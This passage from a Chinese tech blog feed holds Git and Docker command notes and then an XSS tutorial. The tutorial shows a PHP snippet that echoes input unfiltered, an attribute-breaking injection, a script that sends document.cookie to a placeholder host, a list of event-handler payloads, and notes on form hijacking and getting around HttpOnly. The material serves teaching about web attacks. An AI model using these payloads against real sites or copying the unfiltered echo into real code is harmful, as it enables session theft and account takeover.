class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure></div><h1 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> Docker</h1><p><strong>Docker</strong> 是一个开源的应用容器引擎，基于 Go 语言，并遵从 Apache2.0 协议开源。它可以让开发者将应用程序及其依赖包打包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。<strong>Docker</strong> 可用于开发应用、交付应用和运行应用等场景</p><p>容器技术的起源可以追溯到解决重复搭建环境、浪费时间和效率的问题。在没有容器技术之前，虚拟机是一种常见的解决方案，但它们存在资源占用大、启动时间慢等问题。与虚拟机不同，<strong>Docker</strong> 使用容器隔离应用程序的运行时环境，但容器之间可以共享同一个操作系统。这使得容器更轻量且占用更少资源，且启动速度快。因此，<strong>Docker</strong> 成为了打包服务栈的高效方式</p><p>Docker 的主要用途，目前有三大类。</p><p>**（1）提供一次性的环境。** 比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。</p><p>**（2）提供弹性的云服务。** 因为 Docker 容器可以随开随关，很适合动态扩容和缩容。</p><p>**（3）组建微服务架构。** 通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><h2 id="docker命令"><a class="markdownIt-Anchor" href="#docker命令">#</a> Docker 命令</h2><h3 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令">#</a> 基础命令</h3><p>启动 Docker： <code>systemctl start docker</code></p><p>关闭 Docker：  <code>systemctl stop docker</code></p><p>重启 Docker： <code>systemctl restart docker</code></p><p>docker 设置随服务启动而自启动： <code>systemctl enable docker</code></p><p>查看 Docker 运行状态： <code>systemctl status docker</code></p><p>查看 Docker 版本号信息： <code>docker version &amp; docker info</code></p><p>Docker 帮助命令： <code>docker --help</code></p><h3 id="镜像-容器命令"><a class="markdownIt-Anchor" href="#镜像-容器命令">#</a> 镜像 / 容器命令</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/lkoNY3MnVQPK4Hy.jpg" alt="533212df4b4d89ffad49622b744f932.jpg"></p><p><strong>镜像</strong></p><p><code>docker search 镜像id或name</code> ：在 Docker Hub（或其他镜像仓库如阿里镜像）仓库中搜索关键字的镜像</p><p><code>docker pull 镜像id或name</code> ：从仓库中下载镜像，若要指定版本，则要在冒号后指定</p><p><code>docker images</code> ：列出已经下载的镜像，查看镜像</p><p><code>docker rmi 镜像id或name</code> ：删除本地镜像</p><p><code>docker rmi -f 镜像id或name</code> : 删除镜像</p><p><code>docker build</code> ：构建镜像</p><p><code>docker save</code> ：将镜像压缩并保存到本地</p><p><code>docker load</code> ：从本地下载镜像</p><p><strong>容器</strong></p><p><code>docker ps</code> ：列出运行中的容器</p><p><code>docker ps -a</code>  ： 查看所有容器，包括未运行</p><p><code>docker run</code> ：启动容器</p><p><code>docker stop 容器id或name</code> ：停止容器</p><p><code>docker kill 容器id</code> ：强制停止容器</p><p><code>docker start 容器id或name</code> ：启动已停止的容器</p><p><code>docker inspect 容器id</code> ：查看容器的所有信息</p><p><code>docker container logs 容器id</code> ：查看容器日志</p><p><code>docker top 容器id</code> ：查看容器里的进程</p><p><code>docker exec -it 容器id /bin/bash</code> ：进入容器</p><p><code>exit</code> ：退出容器</p><p><code>docker rm 容器id或name</code> ：删除已停止的容器</p><p><code>docker rm -f 容器id</code> ：删除正在运行的容器</p><p><code>docker exec -it 容器ID sh </code> : 进入容器</p><h2 id="数据卷"><a class="markdownIt-Anchor" href="#数据卷">#</a> 数据卷</h2><p><strong>数据卷</strong>（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁</p><p>Docker 将运用与运行的环境打包形成容器运行， Docker 容器产生的数据，如果不通过 docker commit 生成新的镜像，使得数据做为镜像的一部分保存下来， 那么当容器删除后，数据自然也就没有了。 为了能保存数据在 Docker 中我们使用卷。|</p><p>卷就是目录或文件，存在于一个或多个容器中，由 Docker 挂载到容器，但卷不属于联合文件系统（Union FileSystem），因此能够绕过联合文件系统提供一些用于持续存储或共享数据的特性:。</p><p>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此 Docker 不会在容器删除时删除其挂载的数据卷。</p><p>数据卷的特点:</p><p>1. 数据卷可在容器之间共享或重用数据<br> 2. 卷中的更改可以直接生效<br> 3. 数据卷中的更改不会包含在镜像的更新中<br> 4. 数据卷的生命周期一直持续到没有容器使用它为止</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/XQzpv3Wh8VP1owE.jpg" alt="9adc1f8d4b0224fc8531ae9cc96249a.jpg"></p><p>在宿主机 / 容器中的更改会同步到另一方</p><h3 id="命令"><a class="markdownIt-Anchor" href="#命令">#</a> 命令</h3><p>创建数据卷： <code>docker volume create my-vol</code></p><p>查看所有数据卷： <code>docker volume ls</code></p><p>删除数据卷： <code>docker volume rm</code></p><p>查看某个数据卷的详情： <code>docker volume inspect</code></p><p>清除数据卷： <code>docker volume prune</code></p><h2 id="image文件"><a class="markdownIt-Anchor" href="#image文件">#</a> image 文件</h2><p>**Docker 把应用程序及其依赖，打包在 image 文件里面。** 只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p><p>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p><p>image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。</p><p>为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 <a class="link" href="https://hub.docker.com/">Docker Hub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是最重要、最常用的 image 仓库。</p><h2 id="dockerfile"><a class="markdownIt-Anchor" href="#dockerfile">#</a> Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><h3 id="定制镜像"><a class="markdownIt-Anchor" href="#定制镜像">#</a> 定制镜像</h3><p>构建镜像：  <code>docker build -t 镜像名 Dockerfile目录（如是当前所在目录，可用‘.’</code></p><p>镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是  <code>Dockerfile</code> 。</p><p><code>Dockerfile</code>  是一个文本文件，其内包含了一条条的指令 (Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><p>以  <code>nginx</code>  镜像为例，这次我们使用  <code>Dockerfile</code>  来定制。</p><p>在一个空白目录中，建立一个文本文件，并命名为  <code>Dockerfile</code> ：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir mynginx</span><br><span class="line">$ cd mynginx</span><br><span class="line">$ touch Dockerfile</span><br></pre></td></tr></table></figure></div><p>其内容为：</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><p>这个  <code>Dockerfile</code>  很简单，一共就两行。涉及到了两条指令， <code>FROM</code>  和  <code>RUN</code> 。</p><h4 id="from-指定基础镜像"><a class="markdownIt-Anchor" href="#from-指定基础镜像">#</a> <strong>FROM 指定基础镜像</strong></h4><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个  <code>nginx</code>  镜像的容器，再进行修改一样，基础镜像是必须指定的。而  <code>FROM</code>  就是指定<strong>基础镜像</strong>，因此一个  <code>Dockerfile</code>  中  <code>FROM</code>  是必备的指令，并且必须是第一条指令。</p><p>在  <code>Docker Store</code>  上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如  <code>nginx</code> 、 <code>redis</code> 、 <code>mongo</code> 、 <code>mysql</code> 、 <code>httpd</code> 、 <code>php</code> 、 <code>tomcat</code>  等；也有一些方便开发、构建、运行各种语言应用的镜像，如 <code>node</code> 、 <code>openjdk</code> 、 <code>python</code> 、 <code>ruby</code> 、 <code>golang</code>  等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。</p><p>如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 <code>ubuntu</code> 、 <code>debian</code> 、 <code>centos</code> 、 <code>fedora</code> 、 <code>alpine</code>  等，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外， <code>Docker</code>  还存在一个特殊的镜像，名为  <code>scratch</code> 。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><blockquote><p>如果你以  <code>scratch</code>  为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p></blockquote><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 <code>swarm</code> 、 <code>coreos/etcd</code> 。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接  <code>FROM scratch</code>  会让镜像体积更加小巧。使用 Go 语言开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为  <code>Go</code>  是特别适合容器微服务架构的语言的原因之一。</p><h4 id="run-执行命令"><a class="markdownIt-Anchor" href="#run-执行命令">#</a> <strong>RUN 执行命令</strong></h4><p><code>RUN</code>  指令是用来执行命令行命令的。由于命令行的强大能力， <code>RUN</code>  指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li>*<strong>shell* 格式： <code>RUN &lt;命令&gt;</code> ，就像直接在命令行中输入的命令一样。刚才写的  <code>Dockerfile</code>  中的  <code>RUN</code>  指令就是这种格式。</strong></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><ul><li>*<strong>exec* 格式： <code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code> ，这更像是函数调用中的格式。</strong></li></ul><h4 id="其他指令"><a class="markdownIt-Anchor" href="#其他指令">#</a> <strong>其他指令</strong>：</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/Hy4g3sq6nkEbLmQ.png" alt="image.png"></p><h2 id="docker全流程"><a class="markdownIt-Anchor" href="#docker全流程">#</a> Docker 全流程</h2><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/17/yZoqipkB.png" alt="20200927104919216.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;git&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#git&quot;&gt;#&lt;/a&gt; Git&lt;/h1&gt;
&lt;h2 id=&quot;版本控制&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#版本控制&quot;&gt;#&lt;/a&gt; 版本控制&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://example.com/2024/04/15/XSS/"/>
    <id>http://example.com/2024/04/15/XSS/</id>
    <published>2024-04-15T11:22:43.000Z</published>
    <updated>2024-04-15T15:30:54.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1><h2 id="跨站脚本攻击"><a class="markdownIt-Anchor" href="#跨站脚本攻击">#</a> 跨站脚本攻击</h2><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS，而静态站点则完全不受其影响。XSS 的运行原理是将恶意的 script 脚本插入进 html/css/js 文件当中，恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容</p><p>攻击者利用 XSS 漏洞旁路掉访问控制 —— 例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼 (Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的 “缓冲区溢出攻击”，而 JavaScript 是新型的 “ShellCode”。</p><p>xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是<strong>寻找参数未过滤的输出函数。</strong></p><p>例如以下代码：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>代码未对可控制参数做任何过滤，此时就可以利用 x 构建恶意 js 代码获取一定的信息，测试一下 <code>?x=&lt;script&gt;alert(1)&lt;script&gt;</code></p><p>此时是页面会弹出 <code>1</code> ：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/sXjQ6w35zbWBAut.png" alt="image.png"></p><p>xss 漏洞一般是在前端，对用户输入的内容缺少过滤，当用户构造恶意的 script 语句时，就有可能泄露信息，用户可以利用 php 中的输出函数（常见的输出函数有： <code>print</code> 、 <code>print_r</code> 、 <code>echo</code> 、 <code>printf</code> 、 <code>sprintf</code> 、 <code>die</code> 、 <code>var_dump</code> 、 <code>var_export</code> ）来获取敏感信息</p><p>危害影响：</p><blockquote><ul><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ul></blockquote><p>其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上 alert (“say something”) 的。在真正的应用中，XSS 攻击可以干的事情还有很多</p><p><strong>1. 窃取网页浏览中的 cookie 值</strong></p><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie</p><p><strong>2. 劫持流量实现恶意跳转</strong></p><p>这个很简单，就是在网页中想办法插入一句像这样的语句： <script>window.location.href=“<a class="link"   href="http://www.baidu.com" >http://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”;</script>那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p>常出现场景：文章发表、评论、留言、注册资料的地方、修改资料的地方等</p><p>XSS 可以分为反射型、存储型、DOM 型</p><h3 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss">#</a> 反射型 XSS</h3><p>非持久化</p><p>（1）原理<br>  反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性，危害相对较小，但是方便攻击者构造。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/HRqcBeglPQzE4hF.png" alt="image.png"></p><p>（2）攻击方式<br>  攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞</p><p>在判断是否有能利用的 XSS 时，一般需要判断网站过滤了什么字符，然后进行代码注入：<br>面对输入框，先输入 <code>1</code> :</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/JTeYCBVtnUSkmau.png" alt="image.png"></p><p>然后查看源代码，找到输入的 <code>1</code>  出现在什么地方：<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/FkWQ7DNZUM1KVHA.png" alt="image.png"></p><p>插入代码： <code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/xBlZRjIoMrLXdSp.png" alt="image.png"></p><p>注入成功；</p><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  中 <code>&quot;&gt;</code>  闭合了前面的语句，后面 <code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  是实际利用漏洞达到目的的语句</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Djbq3zoIdWvgwyY.png" alt="image.png"></p><h3 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/v8CzH1lJwTtGfe7.png" alt="image.png"></p><p>（1）原理<br>  存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码，会长期存在并有效。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击</p><p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p><h3 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/djA6KrPy3e4OtcU.png" alt="image.png"></p><p>（1）原理<br>  文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作本地跨站，它是基于 DOM 文档对象模型的一种漏洞。DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情</p><p>DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。</p><p>基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。</p><p>（2）攻击方式<br>  用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞</p><h3 id="使用js代码获取cookie"><a class="markdownIt-Anchor" href="#使用js代码获取cookie">#</a> 使用 JS 代码获取 Cookie</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="获取session"><a class="markdownIt-Anchor" href="#获取session">#</a> 获取 session</h3><p>有的时候获取了 Cookie，但是少了 Session，会造成登不进后台，服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，而且我们也无法获取存放在服务端的 Session。如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/yRmvSg7rsHIXkQh.png" alt="image.png"></p><p>想办法进入 phpinfo ()</p><p>利用 beef 进行页面跳转</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/UZmWoGfNuz64Sxd.png" alt="image.png"></p><p>获取页面源码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/jcwyR6NYOaZg7ld.png" alt="image.png"></p><h3 id="httponly"><a class="markdownIt-Anchor" href="#httponly">#</a> HttpOnly</h3><p>如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie</p><p>各种主流语言都支持 HttpOnly</p><h3 id="反制httponly"><a class="markdownIt-Anchor" href="#反制httponly">#</a> 反制 HttpOnly</h3><p>当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录</p><p>（1）Cookie 形式<br>（2）直接账号密码登录</p><p>① 读取保存账号密码<br>  通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/gBu43eYEGRdqSVX.png" alt="image.png"></p><p>type、id、name 通过查看网站源代码中的登录框表单</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/hk6GDgcZiR5MU49.png" alt="image.png"></p><p>② 读取没保存账号密码</p><p>通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Csrn7KIPulTvi5M.png" alt="image.png"></p><p>劫持原理：抓取数据包另外发送一份到跨站平台</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/ELwHWCM3kAbQiTl.png" alt="image.png"></p><p>但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法</p><h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签">#</a> 一些常见标签</h2><p><code>&lt;script&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;input&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;details&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;svg&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;select&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;ifrme&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;video&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;audio&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 